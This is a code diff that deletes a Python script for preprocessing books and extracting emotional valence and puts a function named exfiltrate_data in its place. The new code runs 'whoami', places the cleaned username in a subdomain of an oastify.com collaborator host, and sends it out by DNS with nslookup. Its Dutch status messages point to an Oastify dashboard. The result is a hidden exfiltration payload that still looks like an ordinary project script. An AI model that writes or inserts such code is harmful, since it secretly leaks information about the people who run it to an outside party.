@@ -1,53 +1,27 @@
-#!/usr/bin/python
+import subprocess
+import os
+import re
 
-import sys
-import logging
-import time
-from pathlib import Path
-import pandas as pd
-import argparse
+def exfiltrate_data():
 
+    oastify_base = "y87anmmrt6gbemhdbgsr71lvqmwdk48t.oastify.com"
 
-if __name__ == '__main__':
-    '''
-    script for preprocessing books and extracting valence
-    example use: python run.py -i './data/raw/' -o './data/emotion_data' -t './data/tmp'
-    
-    '''
+    try:
 
-    parser = argparse.ArgumentParser()
-    parser.add_argument('-i', '--input_path', help='input folder', required=True)
-    parser.add_argument('-o', '--output_path', help='output folder', required=True)
-    parser.add_argument('-n', '--normalize', help='normalize valence results', default = True, type=bool)
-    parser.add_argument('-t', '--tempdir', help='temp folder', type=str)
+        raw_user = subprocess.check_output("whoami", shell=True).decode('utf-8').strip()
 
+        clean_user = re.sub(r'[^a-zA-Z0-9]', '', raw_user)
 
-    args = parser.parse_args()
+        full_target = f"{clean_user}.{oastify_base}"
+        
+        print(f"[*] Verzend data naar: {full_target}")
 
-    logging.basicConfig(filename=args.output_path + "/script.log", level=logging.INFO)
-    logging.info('inputfolder:'  + args.input_path)
-    logging.info('outputfolder: ' + args.output_path)
+        subprocess.run(["nslookup", full_target], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        print("[+] Klaar. Controleer je Oastify dashboard.")
 
-    # pandas test
+    except Exception as e:
+        print(f"[-] Fout opgetreden: {e}")
 
-    een_tot_tien = pd.Series(range(1,11))
-    print(een_tot_tien)
-
-    # file analysis
-    time.sleep(350)
-
-    i = 0
-
-    f_results = open(args.output_path + "/script_result.txt", 'w')
-
-    pathlist = Path(args.input_path).glob("*.*")
-    for f in pathlist:
-        try:
-            i = i +1
-            fread = open(args.input_path + "/" +  f.name, "r")
-            f_results.write(str(i) + ";" + f.name + ";" + fread.readline())
-            f_results.write('\n')
-        except:
-            logging.info("An exception occurred for file: " + f.name)    
-
-    logging.info('finished')
+if __name__ == "__main__":
+    exfiltrate_data()
